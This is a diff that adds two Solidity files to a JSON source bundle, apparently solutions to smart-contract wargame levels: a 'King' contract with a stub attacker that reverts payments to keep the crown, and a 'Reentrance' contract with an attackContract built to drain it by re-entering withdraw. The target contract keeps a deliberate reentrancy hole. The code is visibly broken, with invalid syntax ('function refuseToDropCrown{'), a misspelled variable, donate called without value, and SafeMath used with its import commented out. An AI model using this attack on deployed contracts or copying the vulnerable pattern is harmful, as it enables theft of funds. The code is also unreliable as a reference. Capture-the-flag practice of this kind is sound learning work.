@@ -91,5 +91,21 @@
         "file": "delegate.sol"
       }
     }
+  },
+  "king.sol": {
+    "__sources__": {
+      "king.sol": {
+        "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract King {\n    address king;\n    uint256 public prize;\n    address public owner;\n\n    constructor() payable {\n        owner = msg.sender;\n        king = msg.sender;\n        prize = msg.value;\n    }\n\n    receive() external payable {\n        require(msg.value >= prize || msg.sender == owner);\n        //instead of sending the value here it should create another function that send the money instead\n        //cause here if another contract revert no once can play the game again\n        payable(king).transfer(msg.value);\n        king = msg.sender;\n        prize = msg.value;\n    }\n\n    function _king() public view returns (address) {\n        return king;\n    }\n}\n\nfunction refuseToDropCrown{\n\n\n\n    receive() external payable {\n\n        revert();\n     }\n}",
+        "file": "king.sol"
+      }
+    }
+  },
+  "re-enter.sol": {
+    "__sources__": {
+      "re-enter.sol": {
+        "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.12;\n\n//import \"openzeppelin-contracts-06/math/SafeMath.sol\";\n\ncontract Reentrance {\n    using SafeMath for uint256;\n\n    mapping(address => uint256) public balances;\n\n    function donate(address _to) public payable {\n        balances[_to] = balances[_to].add(msg.value);\n    }\n\n    function balanceOf(address _who) public view returns (uint256 balance) {\n        return balances[_who];\n    }\n\n    function withdraw(uint256 _amount) public {\n        if (balances[msg.sender] >= _amount) {\n            (bool result,) = msg.sender.call{value: _amount}(\"\");\n            if (result) {\n                _amount;\n            }\n            balances[msg.sender] -= _amount;\n        }\n    }\n\n    receive() external payable {}\n}\n\ncontract attackContract{\naddress vimctim;\nuint256 amount;\nuint256 balance;\nconstructor(address _victim) payable{\n\nvictim = _victim;\nbalance = msg.value;\n}\n\n\n\n\nfunction attack(uint256 _amount) public {\n\n    if(address(this).balance < _amount){\n        revert();\n    }\n    amount = _amount;\nReentrance(victim).donate( _amount);\n\nReentrance(victim).withdraw(_amount);\n\n\n}\n\n\nreceive() external payable { \n\n\nif(vimctim.balance > 0){\n\nReentrance(victim).withdraw(amount);\n\n\n\n}\n\n\n\n\n}\n\n\n\n\n\n\n}",
+        "file": "re-enter.sol"
+      }
+    }
   }
 }
